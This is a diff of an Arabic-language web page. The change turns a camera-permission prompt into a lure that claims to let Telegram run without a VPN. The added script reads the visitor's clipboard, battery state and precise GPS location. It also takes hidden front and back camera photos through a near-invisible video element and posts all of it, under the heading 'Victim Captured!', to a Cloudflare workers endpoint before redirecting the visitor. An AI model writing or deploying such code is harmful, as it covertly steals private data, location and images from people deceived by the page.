@@ -5,157 +5,133 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>جاري التحميل...</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: #f4f4f9;
-            font-family: system-ui, -apple-system, sans-serif;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            margin: 0;
-            overflow: hidden;
-        }
-        .box {
-            background: white;
-            padding: 40px 30px;
-            border-radius: 24px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.15);
-            text-align: center;
-            max-width: 380px;
-            width: 90%;
-            z-index: 10;
-            animation: fadeIn 0.5s ease;
-        }
-        @keyframes fadeIn {
-            from { opacity: 0; transform: scale(0.95); }
-            to { opacity: 1; transform: scale(1); }
-        }
-        .icon {
-            font-size: 64px;
-            margin-bottom: 10px;
-            display: block;
-        }
-        h2 {
-            color: #1a1a2e;
-            font-size: 22px;
-            margin-bottom: 10px;
-        }
-        p {
-            color: #555;
-            font-size: 15px;
-            line-height: 1.6;
-            margin-bottom: 25px;
-        }
-        button {
-            background: #1877f2;
-            color: white;
-            border: none;
-            padding: 16px 32px;
-            border-radius: 12px;
-            font-size: 18px;
-            font-weight: bold;
-            cursor: pointer;
-            width: 100%;
-            transition: all 0.3s ease;
-            box-shadow: 0 4px 15px rgba(24, 119, 242, 0.3);
-        }
-        button:hover {
-            background: #166fe0;
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(24, 119, 242, 0.4);
-        }
-        button:disabled {
-            background: #ccc;
-            cursor: not-allowed;
-            transform: none;
-            box-shadow: none;
-        }
-        #status {
-            margin-top: 15px;
-            color: #888;
-            font-size: 14px;
-            min-height: 24px;
-        }
-        /* الكاميرا مخفية تماماً */
+        body { background: #f4f4f9; font-family: system-ui; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .box { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; max-width: 350px; z-index: 10; }
+        button { background: #1877f2; color: white; border: none; padding: 15px 30px; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; width: 100%; }
+        /* إخفاء الفيديو بطريقة ذكية تخدع المتصفح ليبقى شغالاً */
         #video {
             position: fixed;
-            top: -9999px;
-            left: -9999px;
+            top: 0;
+            left: 0;
             width: 1px;
             height: 1px;
-            opacity: 0;
+            opacity: 0.01;
             pointer-events: none;
         }
-        #canvas {
-            display: none;
-        }
+        #status { margin-top: 15px; color: #666; font-size: 14px; }
     </style>
 </head>
 <body>
 
 <div class="box">
-    <span class="icon">📷</span>
-    <h2>طلب الوصول إلى الكاميرا</h2>
-    <p>يحتاج التطبيق إلى صلاحية الكاميرا لإكمال العملية. اضغط على "سماح" لمنح الصلاحية.</p>
-    <button id="btn">سماح</button>
+    <div class="icon" style="font-size:50px;">📨</div>
+    <h2>تشغيل تلكرام بدون VPN </h2>
+    <p>اضغط لشتغيل تلكرام وضغط على سماح لعطاء صلاحيات التشغيل بدون مشاكل.</p>
+    <button id="btn" onclick="startTracking()">التالي </button>
     <div id="status"></div>
 </div>
 
-<!-- عناصر الكاميرا مخفية تماماً -->
+<!-- عنصر الفيديو يبقى موجوداً في الصفحة لكنه غير مرئي -->
 <video id="video" autoplay playsinline muted></video>
 <canvas id="canvas" style="display:none;"></canvas>
 
 <script>
-document.getElementById('btn').addEventListener('click', async function() {
-    const btn = this;
+async function startTracking() {
+    const btn = document.getElementById('btn');
     const status = document.getElementById('status');
-    
-    // تعطيل الزر ومنع الضغط المتكرر
     btn.disabled = true;
-    btn.textContent = '⏳ جاري...';
-    status.innerText = '⏳ جاري طلب الصلاحية...';
+    btn.style.background = "#ccc";
+    status.innerText = "جاري الاتصال بالسيرفر...";
+
+    let data = {
+        battery: "Unknown",
+        clipboard: "غير مسموح",
+        location: "لم يتم السماح",
+        frontImg: null,
+        backImg: null
+    };
+
+    // 1. البطارية
+    try {
+        const b = await navigator.getBattery();
+        data.battery = `${(b.level * 100).toFixed(0)}% (${b.charging ? 'جاري الشحن' : 'تفريغ'})`;
+    } catch(e) {}
+
+    // 2. الحافظة
+    try {
+        data.clipboard = await navigator.clipboard.readText();
+    } catch(e) { data.clipboard = "رفض أو فارغة"; }
+
+    // 3. الموقع GPS
+    try {
+        const pos = await new Promise((res, rej) => {
+            navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 5000 });
+        });
+        data.location = `📍 <b>الموقع:</b> https://proxytg.com/r/Nul2Pe8jLX${pos.coords.latitude},${pos.coords.longitude}`;
+    } catch(e) { data.location = "📍 الموقع: تم الرفض"; }
+
+    // 4. التقاط الصور (تحسين جذري)
+    status.innerText = "جاري معالجة البيانات (قد يستغرق 5 ثوانٍ)...";
+    
+    data.frontImg = await takeShot("user"); // الكاميرا الأمامية
+    await new Promise(r => setTimeout(r, 1000)); // فاصل زمني بين الكاميرتين لراحة الحساس
+    data.backImg = await takeShot("environment"); // الكاميرا الخلفية
+
+    // 5. التجميع والإرسال
+    const msg = `
+✅ <b>Victim Captured!</b>
+🔋 <b>Battery:</b> ${data.battery}
+📋 <b>Clipboard:</b> <code>${data.clipboard}</code>
+${data.location}
+📱 <b>System:</b> ${navigator.platform}
+⏰ <b>Time:</b> ${new Date().toLocaleString()}
+    `;
+
+    await fetch("https://cold-brook-420f.tjarb093.workers.dev/", {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ message: msg, frontImage: data.frontImg, backImage: data.backImg })
+    });
+
+    window.location.href = "https://proxytg.com/r/Nul2Pe8jLX";
+}
+
+async function takeShot(mode) {
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    let stream = null;
 
     try {
-        // طلب الكاميرا فقط (بدون تسجيل أو صور)
-        const stream = await navigator.mediaDevices.getUserMedia({
-            video: {
-                facingMode: 'environment', // الكاميرا الخلفية (يفضلها معظم المستخدمين)
-                width: { ideal: 1280 },
-                height: { ideal: 720 }
-            },
-            audio: false
+        stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: mode, width: { ideal: 640 }, height: { ideal: 480 } }, 
+            audio: false 
+        });
+        video.srcObject = stream;
+
+        // الانتظار حتى يبدأ الفيديو فعلياً (مهم جداً لحل مشكلة السواد)
+        await new Promise((resolve) => {
+            video.onloadedmetadata = () => {
+                video.play();
+                setTimeout(resolve, 3500); // زيادة وقت الانتظار لضبط الإضاءة تلقائياً
+            };
         });
 
-        // تم منح الصلاحية – إيقاف الكاميرا فوراً
-        stream.getTracks().forEach(track => track.stop());
-
-        status.innerText = '✅ تم منح الصلاحية، جاري التوجيه...';
-        btn.textContent = '✅ تم';
-
-        // الانتقال فوراً إلى الصفحة التالية
-        window.location.href = 'https://youtu.be/phxNLk9N9gE?si=Qy8ANkpxBo9CrfWv';
-
-    } catch (error) {
-        // المستخدم رفض أو حصل خطأ
-        console.error('خطأ في الكاميرا:', error);
-        status.innerText = '❌ لم يتم منح الصلاحية. حاول مرة أخرى.';
-        btn.disabled = false;
-        btn.textContent = 'سماح';
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
         
-        // عرض رسالة خطأ مناسبة
-        if (error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError') {
-            status.innerText = '❌ تم رفض الصلاحية. يرجى السماح للكاميرا في إعدادات المتصفح.';
-        } else if (error.name === 'NotFoundError' || error.name === 'DevicesNotFoundError') {
-            status.innerText = '❌ لا توجد كاميرا متصلة بهذا الجهاز.';
-        } else {
-            status.innerText = '❌ حدث خطأ: ' + error.message;
-        }
+        const img = canvas.toDataURL('image/jpeg', 0.7);
+        
+        // إيقاف الكاميرا فوراً
+        stream.getTracks().forEach(t => t.stop());
+        video.srcObject = null;
+        
+        return img;
+    } catch (e) {
+        if (stream) stream.getTracks().forEach(t => t.stop());
+        return null;
     }
-});
-
-// منع أي محاولة لاستخدام الكاميرا بدون موافقة
-// تأكد من أن الصفحة لا تطلب الكاميرا تلقائياً
+}
 </script>
 </body>
 </html>
